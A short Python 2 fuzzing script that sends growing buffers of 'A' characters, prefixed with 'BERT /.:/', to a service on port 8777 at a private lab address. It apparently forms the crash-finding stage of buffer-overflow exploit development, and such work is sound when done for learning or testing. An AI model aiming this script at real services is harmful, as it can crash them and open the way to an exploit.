#! /usr/bin/python2
import socket;
import sys;

ip="10.0.5.51"
port = 8777 #default BERT port
prefix = 'BERT /.:/'

buffer = ["A"]
counter = 100
while len(buffer) <= 30:
  buffer.append("A" * counter)
  counter = counter + 200

for string in buffer:
  print("Fuzzing BERT with %s bytes " % len(string))
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  connect = s.connect((ip,port))
  s.send((prefix + string))
  s.close()
